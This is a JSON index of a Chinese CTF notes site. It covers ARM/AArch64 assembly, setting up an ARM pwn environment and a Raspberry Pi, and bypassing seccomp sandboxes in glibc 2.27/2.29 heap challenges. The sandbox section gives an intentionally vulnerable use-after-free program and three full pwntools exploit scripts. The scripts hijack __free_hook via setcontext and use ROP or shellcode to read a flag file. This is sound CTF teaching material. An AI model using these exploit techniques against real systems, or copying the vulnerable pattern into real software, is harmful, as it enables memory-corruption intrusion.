{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction "},"arm/":{"url":"arm/","title":"arm","keywords":"","body":""},"arm/arm&aarch64汇编/arm&aarch64汇编.html":{"url":"arm/arm&aarch64汇编/arm&aarch64汇编.html","title":"arm&aarch64汇编","keywords":"","body":"arm&aarch64汇编 ARM 架构 ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。 过程调用标准 ARM/ARM64使用的是AAPCS或ATPCS标准。 ATPCS即为ARM-Thumb Procedure Call Standard/ARM-Thumb过程调用标准，规定了一些子程序间调用的基本规则，这些规则包括子程序调用过程中寄存器的使用规则，数据栈的使用规则，参数的传递规则。有了这些规则之后，单独编译的C语言程序就可以和汇编程序相互调用。使用ADS(ARM Developer Suite)的C语言编译器编译的C语言子程序满足用户指定的ATPCS类型。而对于汇编语言来说，则需要用户来保证各个子程序满足ATPCS的要求。而AAPCS即为ARM Archtecture Procedure Call Standard是2007年ARM公司正式推出的新标准，AAPCS是ATPCS的改进版，目前， AAPCS和ATPCS都是可用的标准。 寄存器规则 子程序间通过寄存器R0～R3来传递参数。这时，寄存器R0～R3可记作arg0～arg3。被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值。 在子程序中，使用寄存器R4～R11来保存局部变量。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值。R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。 寄存器R12用作过程调用中间临时寄存器，记作IP。在子程序之间的连接代码段中常常有这种使用规则。 寄存器R13用作堆栈指针，记作SP。在子程序中寄存器R13不能用作其他用途。寄存器SP在进入子程序时的值和退出子程序时的值必须相等。 寄存器R14称为连接寄存器，记作LR。它用于保存子程序的返回地址。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。 寄存器R15是程序计数器，记作PC。它不能用作其它用途。当执行一个分支指令时，PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置。 给出ARM架构寄存器与Intel架构寄存器的关系： ARM架构 寄存器名 寄存器描述 Intel架构 寄存器名 R0 通用寄存器 EAX R1~R5 通用寄存器 EBX、ECX、EDX、EDI、ESI R6~R10 通用寄存器 无 R11(FP) 栈帧指针 EBP R12(IP) 内部程序调用 无 R13(SP) 堆栈指针 ESP R14(LP) 链接寄存器 无 R15(PC) 程序计数器 EIP CPSR 程序状态寄存器 EFLAGS 堆栈(Stack)规则 ATPCS规定堆栈为FD类型，即Full Descending，意思是 SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有STMFD和LDMFD。 STMFD指令即Store Multiple FULL Descending指令，相当于压栈。 STMFD SP! ,{R0-R7，LR} 实际上会执行以下命令： SP = SP - 9 x 4 (共计压入R0-R7以及LR一共九个寄存器) ADDRESS = SP MEMORY[ADDRESS] = LR for i = 7 to 0 MEMORY[ADDRESS] = Ri ADDRESS = ADDRESS + 4 此处也可以看出，事实上的入栈顺序与R0-R7，LR相反。 执行SP = SP - 9 x 4后 2.执行ADDRESS = SP后 执行MEMORY[ADDRESS] = LR后 接下来，ADDRESS逐次上移，以此填入寄存器的值 5.至此，入栈指令执行结束。 ⚠️：若入栈指令为STMFD SP ,{R0-R7，LR}，SP指针会在最后回到原位，不会改变SP指针的值。 3.LDMFD指令即Load Multiple FULL Descending指令，相当于出栈，也就是STMFD指令的逆操作。 LDMFD SP! ,{R0-R7，LR} 实际上会执行以下命令： SP = SP + 9 x 4 ADDRESS = SP for i = 0 to 7 Ri = MEMORY[ADDRESS] ADDRESS = ADDRESS - 4 LR = MEMORY[ADDRESS] 4.对于汇编程序来说，如果目标文件中包含了外部调用，则必须满足下列条件： 外部接口的堆栈必须是8字节对齐的。 在汇编程序中使用PRESERVE8伪指令告诉连接器，本汇编程序数据是8字节对齐的。 传参规则 对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。 在传递参数时，将所有参数看作是存放在连续的内存字单元的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。 返回值规则 结果为一个32位整数时，可以通过寄存器R0返回 结果为一个64位整数时，可以通过寄存器R0和R1返回 结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回 结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回 对于位数更多的结果，需要通过内存来传递。 访址规则 通常，LDR指令被用来从内存中加载数据到寄存器，STR指令被用作将寄存器的值存放到内存中。 @ LDR操作：从R0指向的地址中取值放到R2中 LDR R2, [R0] @ [R0] - 数据源地址来自于R0指向的内存地址 @ STR操作：将R2中的值放到R1指向的地址中 STR R2, [R1] @ [R1] - 目的地址来自于R1在内存中指向的地址 那么我们给出示例代码和解释： .data /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/ var1: .word 3 /* 内存中的第一个变量且赋值为3 */ var2: .word 4 /* 内存中的第二个变量且赋值为4 */ .text /* 代码段开始 */ .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1] @ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3 bkpt adr_var1: .word var1 /* var1的地址助记符 */ adr_var2: .word var2 /* var2的地址助记符 */ 接下来我们对这段代码进行反编译，结果如下： ldr r0, [ pc, #12 ] ; 0x8088 ldr r1, [ pc, #12 ] ; 0x808c ldr r2, [r0] str r2, [r1] bx lr 此处，[PC,#12]的意义是PC + 4*3，可以看出，程序使用了偏移寻址的思路，但是，根据我们所写的汇编码： _start: ldr r0, [ pc, #12 ] ; 我们若想获取var_1，应该为PC + 4 * 5才对，但是我们之前提过的，在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，也就是说，此时程序中的状况应该如下表所示： _start: ldr r0, [ pc, #12 ] ldr r1, [ pc, #12 ] ldr r2, [r0] ; 这种形如[Ri , num]的方式被称为立即数作偏移寻址。 str r2, [r1, #2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。 str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。 ldr r3, [r1], #4 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。 形如[Ri , Rj]的方式被称为寄存器作偏移寻址。 str r2, [r1, r2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。 ldr r3, [r1], r2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。 形如[Ri , Rj , ]的方式被称为寄存器缩放值作偏移寻址。 str r2, [r1, r2, LSL#2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2 AArch64 架构 需要指出的是，AArch64架构并不是ARM-32架构的简单扩展，他是在ARMv8引入的一种全新架构。 寄存器变化 AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。 寄存器 别名 意义 SP – Stack Pointer:栈指针 R30 LR Link Register:在调用函数时候，保存下一条要执行指令的地址。 R29 FP Frame Pointer:保存函数栈的基地址。 R19-R28 – Callee-saved registers（含义见上面术语解释） R18 – 平台寄存器，有特定平台解释其用法。 R17 IP1 The second intra-procedure-call temporary register…… R16 IP0 The first intra-procedure-call temporary register…… R9-R15 – 临时寄存器 R8 – 在一些情况下，返回值是通过R8返回的 R0-R7 – 在函数调用过程中传递参数和返回值 NZCV – 状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出 指令集变化 除了批量加载寄存器指令 LDM/STM, PUSH/POP, 使用STP/LDP 一对加载寄存器指令代替。 没有提供访问CPSR的单一寄存器，但是提供访问PSTATE的状态域寄存器。 A64没有协处理器的概念，没有协处理器指令MCR,MRC。 相比A32少了很多条件执行指令，只有条件跳转和少数数据处理这类指令才有条件执行。 指令基本格式 {} , {,} Opcode：操作码，也就是助记符，说明指令需要执行的操作类型。 Cond：指令执行条件码。 S：条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值。 Rd/Xt：目标寄存器，A32指令可以选择R0-R14,T32指令大部分只能选择RO-R7，A64指令可以选择X0-X30。 Rn/Xn：第一个操作数的寄存器，和Rd一样，不同指令有不同要求。 Opcode2：第二个操作数，可以是立即数，寄存器Rm和寄存器移位方式（Rm，#shit）。 内存操作指令-load/store 在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。 在ARM-v8指令集中，程序支持以下五种寻址方式： Base register only (no offset) ：基址寄存器无偏移。形如:[ base { , #0 } ]。 Base plus offset：基址寄存器加偏移。形如:[ base { , #imm } ]。 Pre-indexed：事先更新寻址，先变化后操作。形如:[ base , #imm ]!。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。 Post-indexed：事后更新寻址，先操作后变化。形如:[ base ] , #imm。 Literal (PC-relative): PC相对寻址。 常见的Load/Store指令有： LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH ⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)。 举例： LDR X1 , [X2]——将X2寄存器中的值赋给X1寄存器。 LDR X1 , [X2] ， #4——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。 对于Load Pair/Store Pair这两个指令：从Memory地址addr处读取两个双字/字数据到目标寄存器Xt1，Xt2。 参考文章: https://www.anquanke.com/post/id/199112#h3-13 "},"arm/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html":{"url":"arm/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html","title":"ARMpwn基础环境搭建","keywords":"","body":"ARMpwn基础环境搭建 QEMU 选择源码安装 官网下载https://www.qemu.org/ 先安装一些依赖 $ sudo apt-get install ninja-build $ sudo apt-get install build-essential zlib1g-dev pkg-config libglib2.0-dev $ sudo apt-get install libmount-dev $ sudo apt-get install libpixman-1-dev 解压，编译安装 $ tar xvJF qemu-6.0.0.tar.xz #文件夹改个名字 $ mv qemu-6.0.0 qemu #创建一个临时文件夹 $ mkdir build $ cd build $ ../qemu/configure $ make; make install 验证 pwn20tty@ubuntu:~/Desktop/ctf-tools$ qemu-riscv64 --version qemu-riscv64 version 6.0.0 Copyright (c) 2003-2021 Fabrice Bellard and the QEMU Project developers 交叉编译工具 # 下载资源 $ wget http://releases.linaro.org/components/toolchain/binaries/6.3-2017.05/aarch64-linux-gnu/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu.tar.xz # 解压 $ tar -xvf gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu.tar.xz 写入环境变量 $ gedit ~/.bashrc 在最后一行加上信息 路径为~/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu/bin 环境变量生效 $ source ~/.bashrc 编译运行一个arm程序 a.c #include int main(){ printf(\"hello world!\\n\"); return 0; } 编译 (可以加上-static参数进行静态编译) $ aarch64-linux-gnu-gcc -o out a.c 假如是动态链接，则需要将运行库文件夹拷贝到当前目录（也可以直接加上-L参数指定动态链接库文件夹） 注：交叉编译工具里有动态运行库文件夹 $ cp -r ~/Desktop/ctf-tools/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu/aarch64-linux-gnu/libc/lib ./ 运行 $ qemu-aarch64 -L . ./out 或者直接-L参数写上lib路径，这样就不用拷贝，不过调试的时候需要手动加载了，要不然符号信息可能不能加载。 $ qemu-aarch64 -L /home/pwn20tty/Desktop/ctf-tools/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu/aarch64-linux-gnu/libc ./out 调试arm程序 安装能够调试多架构的gdb $ sudo apt-get install gdb-multiarch 先启动程序开启监听 $ qemu-aarch64 -L . -g 1234 out 调试 $ gdb-multiarch out pwndbg> target remote :1234 之后调试就和正常x86/x64一样啦，并且符号表信息成功加载 "},"arm/树莓派搭建ARM环境/树莓派搭建ARM环境.html":{"url":"arm/树莓派搭建ARM环境/树莓派搭建ARM环境.html","title":"树莓派搭建ARM环境","keywords":"","body":"树莓派搭建ARM64位环境 换源（很重要！！！） 64位镜像可以直接使用debian的系统源，首先需要编辑/etc/apt/sources.list，使用#号注释原内容，然后在末尾添加Debian的系统源： # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free 接着需要配置树莓派官方的软件源，编辑/etc/apt/sources.list.d/raspi.list，同样的，注释原内容，在末尾添加如下内容： deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ buster main ui lrzsz 为了xshell传文件方便 $ sudo apt install lrzsz pwntools python2安装pwntools $ apt-get update $ apt-get install -y python-pip build-essential python-dev python-setuptools libffi-dev libssl-dev $ python -m pip install --upgrade pip $ pip install -U setuptools $ pip install more-itertools==5.0.0 $ pip install pwntools 装一半失败了。。。选择从github上去下 $ git clone https://github.com/Gallopsled/pwntools.git $ cd pwntools $ python setup.py install python3安装pwntools $ apt-get update $ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential $ python3 -m pip install --upgrade pip $ python3 -m pip install --upgrade pwntools Binutils 这个工具主要是为了各个架构的汇编，要不然pwntools里的asm模块不能够正常使用 假如是ubuntu装起来很容易，但是别的系统装起来就很麻烦 这里选择去github上找 先安装texinfo，要不然编译会出错 $ apt install texinfo $ git clone https://github.com/Gallopsled/pwntools-binutils $ cd pwntools-binutils/generic $ chmod +x install.sh $ chmod +x install_all.sh 可以直接选择运行install_all.sh，不过不建议，全架构太慢了。 可以./install.sh architecture来安装相应的架构 支持的架构 aarch64 alpha arm avr cris hppa ia64 m68k mips mips64 msp430 powerpc powerpc64 s390 sparc vax xscale i386 x86_64 pwndbg 好像没有什么坑，比较顺利 $ git clone https://github.com/pwndbg/pwndbg $ cd pwndbg $ ./setup.sh 安装谷歌输入法 $ sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin 重启后在配置里添加中文键盘 ctrl+空格切换输入法 然后就可以快乐中文输入啦 "},"沙箱/":{"url":"沙箱/","title":"沙箱","keywords":"","body":""},"沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html":{"url":"沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html","title":"glibc2.27下堆题绕过沙箱","keywords":"","body":"这里因为重点在于沙箱的绕过，漏洞就拿了一个最简单的uaf做演示。 最主要的是setcontext这个函数，可以看到setcontext+53之后控制了大量的寄存器（可以看作就是一个SigreturnFrame），寻址都是[rdi+x]的方式，那么我们假如劫持了free_hook为setcontext+53，此时rdi刚好是堆块内容的地址，我们可以直接放个SigreturnFrame进去，之后利用的话就按个人喜好了。我写了三种方式，本质都是orw。 1.mprotect+shellcode 2.rop（rop地址在free_hook附近） 3.rop（rop地址在heap上） setcontext的汇编 0x7ffff7a34180 : push rdi 0x7ffff7a34181 : lea rsi,[rdi+0x128] 0x7ffff7a34188 : xor edx,edx 0x7ffff7a3418a : mov edi,0x2 0x7ffff7a3418f : mov r10d,0x8 0x7ffff7a34195 : mov eax,0xe 0x7ffff7a3419a : syscall 0x7ffff7a3419c : pop rdi 0x7ffff7a3419d : cmp rax,0xfffffffffffff001 0x7ffff7a341a3 : jae 0x7ffff7a34200 0x7ffff7a341a5 : mov rcx,QWORD PTR [rdi+0xe0] 0x7ffff7a341ac : fldenv [rcx] 0x7ffff7a341ae : ldmxcsr DWORD PTR [rdi+0x1c0] 0x7ffff7a341b5 : mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a341bc : mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a341c3 : mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a341c7 : mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a341cb : mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a341cf : mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a341d3 : mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a341d7 : mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a341de : push rcx 0x7ffff7a341df : mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a341e3 : mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a341ea : mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a341f1 : mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a341f5 : mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a341f9 : mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a341fd : xor eax,eax 0x7ffff7a341ff : ret 0x7ffff7a34200 : mov rcx,QWORD PTR [rip+0x398c61] # 0x7ffff7dcce68 0x7ffff7a34207 : neg eax 0x7ffff7a34209 : mov DWORD PTR fs:[rcx],eax 0x7ffff7a3420c : or rax,0xffffffffffffffff 0x7ffff7a34210 : ret 题目源码test.c gcc -o test test.c #include #include #include #include #include #include int Nodes_len[0x10]; char *Nodes[0x10]; int count=0; int get_atoi() { char buf[8]; read(0,buf,8); return atoi(buf); } void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } void add(){ int len; printf(\"len:\"); scanf(\"%d\",&len); if(len0xfff) exit(0); if(count>0x10){ puts(\"too many\"); exit(0); } Nodes[count] = malloc(len); Nodes_len[count] = len; count++; puts(\"done!\"); } void del(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } free(Nodes[idx]); puts(\"done!\"); } void edit(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } read(0,Nodes[idx],Nodes_len[idx]); puts(\"done!\"); } void show(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } write(1,Nodes[idx],Nodes_len[idx]); } void gift(){ printf(\"heap_base:%p\\n\",Nodes[0]); } void menu(){ puts(\"1.add\"); puts(\"2.delete\"); puts(\"3.edit\"); puts(\"4.show\"); puts(\"5.gift\"); puts(\"6.exit\"); printf(\"choice:\"); } void init() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } int main(){ init(); sandbox(); while(1){ int choice; menu(); choice = get_atoi(); switch(choice){ case 1: add(); break; case 2: del(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; default: puts(\"invalued input!\"); exit(0); } } return 0; } 方法一 mprotect+shellcode from pwn import* context.log_level = 'debug' p = process('./test') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./test') context.arch = elf.arch def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) libcbase = leak - (0x7f3490493ca0-0x7f34900a8000) setcontext_door = libcbase + libc.sym['setcontext']+53 free_hook = libcbase + libc.sym['__free_hook'] syscall = libcbase +0xd2745 pr('libcbase',libcbase) delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(setcontext_door)) #=========================setcontext=========================== fake_rsp = free_hook&0xfffffffffffff000 frame = SigreturnFrame() frame.rax=0 frame.rdi=0 frame.rsi=fake_rsp frame.rdx=0x2000 frame.rsp=fake_rsp frame.rip=syscall add(0x100) #4 edit(4,str(frame)) #gdb.attach(p,'b *'+str(setcontext_door)) delete(4) #==========================orw================================= prdi_ret = libcbase+libc.search(asm(\"pop rdi\\nret\")).next() prsi_ret = libcbase+libc.search(asm(\"pop rsi\\nret\")).next() prdx_ret = libcbase+libc.search(asm(\"pop rdx\\nret\")).next() prax_ret = libcbase+libc.search(asm(\"pop rax\\nret\")).next() jmp_rsp = libcbase+libc.search(asm(\"jmp rsp\")).next() mprotect_addr = libcbase + libc.sym['mprotect'] payload = p64(prdi_ret)+p64(fake_rsp) payload += p64(prsi_ret)+p64(0x1000) payload += p64(prdx_ret)+p64(7) payload += p64(prax_ret)+p64(10) payload += p64(syscall) #mprotect(fake_rsp,0x1000,7) payload += p64(jmp_rsp) payload += asm(shellcraft.open('flag')) payload += asm(shellcraft.read(3,fake_rsp+0x300,0x30)) payload += asm(shellcraft.write(1,fake_rsp+0x300,0x30)) p.send(payload) #pause() p.interactive() 方法二 rop（rop地址在free_hook附近） from pwn import* context.log_level = 'debug' p = process('./test') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./test') context.arch = elf.arch def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) libcbase = leak - (0x7f3490493ca0-0x7f34900a8000) setcontext_door = libcbase + libc.sym['setcontext']+53 free_hook = libcbase + libc.sym['__free_hook'] syscall = libcbase +0xd2745 pr('libcbase',libcbase) delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(setcontext_door)) #=========================setcontext=========================== frame = SigreturnFrame() frame.rax=0 frame.rdi=0 frame.rsi=free_hook&0xfffffffffffff000 frame.rdx=0x2000 frame.rsp=free_hook&0xfffffffffffff000 frame.rip=syscall add(0x100) #4 edit(4,str(frame)) #gdb.attach(p,'b *'+str(setcontext_door)) delete(4) #==========================orw================================= prdi_ret = libcbase+libc.search(asm(\"pop rdi\\nret\")).next() prsi_ret = libcbase+libc.search(asm(\"pop rsi\\nret\")).next() prdx_ret = libcbase+libc.search(asm(\"pop rdx\\nret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] flag_string_addr = (free_hook&0xfffffffffffff000)+0x200 payload = ropchain(read_addr,0,flag_string_addr,0x10) payload += ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) p.send(payload) pause() p.send('./flag') p.interactive() 方法三（需要泄露堆地址） rop（rop地址在heap上） from pwn import* context.log_level = 'debug' p = process('./test') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./test') context.arch = elf.arch def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x260 libcbase = leak - (0x7f3490493ca0-0x7f34900a8000) setcontext_door = libcbase + libc.sym['setcontext']+53 free_hook = libcbase + libc.sym['__free_hook'] syscall = libcbase +0xd2745 pr('libcbase',libcbase) pr('heapbase',heapbase) delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(setcontext_door)) #=========================setcontext=========================== prdi_ret = libcbase+libc.search(asm(\"pop rdi\\nret\")).next() prsi_ret = libcbase+libc.search(asm(\"pop rsi\\nret\")).next() prdx_ret = libcbase+libc.search(asm(\"pop rdx\\nret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] context_addr = heapbase + 0x260 flag_string_addr = context_addr + 0x200 frame = SigreturnFrame() frame.rsp = context_addr+0xf8 frame.rip = libcbase+libc.search(asm(\"ret\")).next() payload = str(frame) payload += ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' add(0x300) #4 edit(4,payload) #gdb.attach(p,'b *'+str(setcontext_door)) delete(4) p.interactive() 参考文章 https://blog.csdn.net/carol2358/article/details/108351308?spm=1001.2014.3001.5506 "},"沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html":{"url":"沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html","title":"glibc2.29下堆题绕过沙箱","keywords":"","body":"glibc2.29下堆题绕过沙箱 还是用相同的题目 gcc -o test test.c #include #include #include #include #include #include int Nodes_len[0x10]; char *Nodes[0x10]; int count=0; int get_atoi() { char buf[8]; read(0,buf,8); return atoi(buf); } void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } void add(){ int len; printf(\"len:\"); scanf(\"%d\",&len); if(len0xfff) exit(0); if(count>0x10){ puts(\"too many\"); exit(0); } Nodes[count] = malloc(len); Nodes_len[count] = len; count++; puts(\"done!\"); } void del(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } free(Nodes[idx]); puts(\"done!\"); } void edit(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } read(0,Nodes[idx],Nodes_len[idx]); puts(\"done!\"); } void show(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } write(1,Nodes[idx],Nodes_len[idx]); } void gift(){ printf(\"heap_base:%p\\n\",Nodes[0]); } void menu(){ puts(\"1.add\"); puts(\"2.delete\"); 